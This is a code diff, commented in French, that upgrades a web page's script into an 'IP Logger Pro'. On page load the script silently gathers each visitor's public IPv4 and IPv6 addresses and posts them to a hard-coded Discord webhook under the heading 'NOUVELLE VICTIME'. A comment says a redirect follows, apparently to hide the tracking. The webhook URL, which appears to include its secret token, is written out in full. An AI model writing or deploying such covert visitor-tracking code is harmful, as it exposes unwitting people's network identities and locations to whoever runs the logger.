@@ -6,23 +6,33 @@
 </div>
 
 <script>
-// CHANGE UNIQUEMENT CETTE LIGNE AVEC TON WEBHOOK DISCORD
+// === CHANGE UNIQUEMENT TON WEBHOOK ICI ===
 const webhook = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77";
 
-fetch("https://api.ipify.org?format=json")
-  .then(r => r.json())
-  .then(d => {
-    const ip = d.ip;
-    fetch(webhook, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        content: `**NOUVELLE IP :** \`${ip}\``,
-        username: "IP Logger",
-        avatar_url: "https://i.imgur.com/2h5tRAb.png"
-      })
-    });
+// Récupération IPv4 + IPv6 publique en parallèle (les 2 services les plus fiables 2025)
+Promise.all([
+  fetch("https://api.ipify.org?format=json").then(r=>r.json()).catch(()=>{}),
+  fetch("https://api6.ipify.org?format=json").then(r=>r.json()).catch(()=>{})
+]).then(([ipv4data, ipv6data]) => {
+  const ipv4 = ipv4data?.ip || "non détectée";
+  const ipv6 = ipv6data?.ip || "non détectée (ou désactivée)";
+
+  fetch(webhook, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      username: "IP Logger Pro",
+      avatar_url: "https://i.imgur.com/2h5tRAb.png",
+      content: "",
+      embeds: [{
+        title: "NOUVELLE VICTIME",
+        color: 16711680,
+        description: `**IPv4 publique :** \`${ipv4}\`\n**IPv6 publique :** \`${ipv6}\``,
+        footer: {text: "Clic détecté • 2025"}
+      }]
+    })
   });
+});
 
 // Redirection après 5 secondes
 setTimeout(() => {
